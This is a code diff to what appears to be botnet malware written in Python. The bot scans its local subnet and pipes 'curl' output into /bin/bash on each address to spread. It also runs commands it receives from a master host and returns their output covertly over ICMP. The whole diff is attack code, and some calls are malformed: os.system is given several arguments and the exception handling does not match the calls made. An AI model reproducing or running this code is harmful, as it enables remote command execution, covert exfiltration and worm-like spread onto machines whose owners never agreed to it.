@@ -45,8 +45,7 @@ class Handler(threading.Thread):
 					for i in range(1,253):
 						if i != octets[3]:
 							try:
-								out = subprocess.check_output("curl", self.web ,octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i), "|","/bin/bash")
-								send_icmp(localhost, self.master, "EXPLOIT-OUTPUT"+out)
+								os.system("curl ", self.web ,octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i)+ "|/bin/bash")
 							except subprocess.CalledProcessError as e:
 								pass	
 			else:
@@ -55,13 +54,12 @@ class Handler(threading.Thread):
 				print("RECEIVED: "+cmd)
 				try:
 					os.system(cmd + " > /tmp/tmp.dat")
-					out = subprocess.check_output("cat", "/tmp/tmp.dat")
-					#out = subprocess.check_output(cmd.split())
-					os.system("rm","-f","/tmp/tmp.dat")
+					out = subprocess.check_output(["cat", "/tmp/tmp.dat"])
+					os.system("rm -f /tmp/tmp.dat")
 					print("OUT: "+str(out))
-					send_icmp(localhost, self.master, "OUTPUT:"+localhost+"\n"+out)
+					send_icmp(localhost, self.master, localhost+">>\n"+out)
 				except subprocess.CalledProcessError as e:
-					send_icmp(localhost, self.master, "ERROR:"+localhost+"\n"+e.output)
+					send_icmp(localhost, self.master, localhost+">>\n"+e.output)
 
 def init():
 	print("Bot started...["+localhost+"]")
